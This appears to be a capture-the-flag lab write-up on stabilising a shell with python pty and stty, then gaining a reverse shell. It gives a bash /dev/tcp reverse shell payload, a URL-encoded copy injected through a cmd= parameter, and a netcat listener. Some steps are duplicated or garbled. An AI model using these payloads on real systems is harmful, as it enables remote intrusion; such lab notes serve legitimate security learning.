Now that we have a shell on the box, we want to stabilize our shell. For the most part, stabilizing shells is straightforward by using other utilities like python to help; however, some steps can take longer or change depending on the shell you use. The below instructions will be for bash and ZSH; any other shells or operating systems, you will need to do your research on stabilizing shells within their environment.  

Instructions found throughout this room are inspired by this fantastic blog post, [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). All credit for the techniques shown goes to ropnop.  

There are several ways to stabilize a shell; we will be focusing on using python to create a pseudo-terminal and modifying stty options. The steps are the same for all target machines, but they may differ depending on the shell or operating system used on your attacking machine.  

To begin, we will create a pseudo-terminal using python. The command can be found below.  

Syntax: `python -c 'import pty; pty.spawn("/bin/bash")'`

Once we have a pseudo shell, we can pause the terminal and modify stty options to optimize the terminal. Follow the steps below exactly for bash shells.  

1. `stty raw -echo`

2. `fg`

**Note****:** If you're using ZSH, you **must** combine `stty raw -echo;fg`  onto one line, or else your shell will break  

At this point, you will get your pseudo-terminal back, but you may notice that whatever you type does not show up. For the next step, you will need to type blindly.  

3. `reset`

4. `export SHELL=BASH`

For the next two steps, you will need to use the information you got from step 1. 

5. `export SHELL=BASH`

6. `export TERM=<TERMINAL>`

7. `stty rows <num> columns <cols>`


---

# Your job

## Reverse Shell

- Payload is: `/bin/bash -c "bash -i >& /dev/tcp/<Attack_IP>/9001 0>&1"`.
- Encode the payload as URL.
	`%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%35%30%2e%37%34%2e%31%36%35%2f%39%30%30%31%20%30%3e%26%31%22yloa`
- Add the payload to the cmd= parameter on the browser (Better on Burp Suite Repeater).

	![[Task 14 - Meterpreter session 1 closed. Reason RUH ROH-20240907132955710.webp]]

## Listener

- On your attacking machine open a netcat listener.

	`nc -lnvp 9001`

- On Repeater click "Send".

	![[Task 14 - Meterpreter session 1 closed. Reason RUH ROH-20240907133230772.webp]]

	Your got a Revers Shell.


**Next step:** [[Task - 15 Docker? I hardly even know her!]]
